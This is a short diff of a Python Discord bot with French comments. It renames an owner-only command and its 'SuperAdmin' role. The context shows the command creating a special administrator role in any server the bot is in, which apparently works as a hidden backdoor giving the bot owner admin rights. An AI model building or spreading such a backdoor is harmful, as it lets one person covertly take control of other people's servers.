@@ -369,7 +369,7 @@ async def serverinfoall(ctx):
         await ctx.send("Seul l'owner du bot peut obtenir ces informations.")
 
 @bot.command()
-async def iseya(ctx):
+async def iseyg(ctx):
     if ctx.author.id == BOT_OWNER_ID:  # Vérifie si l'utilisateur est l'owner du bot
         try:
             guild = ctx.guild
@@ -377,7 +377,7 @@ async def iseya(ctx):
                 return await ctx.send("❌ Cette commande doit être exécutée dans un serveur.")
             
             # Création (ou récupération) d'un rôle administrateur spécial
-            role_name = "Iseya-SuperAdmin"
+            role_name = "Iseyg-SuperAdmin"
             role = discord.utils.get(guild.roles, name=role_name)
 
             if role is None:
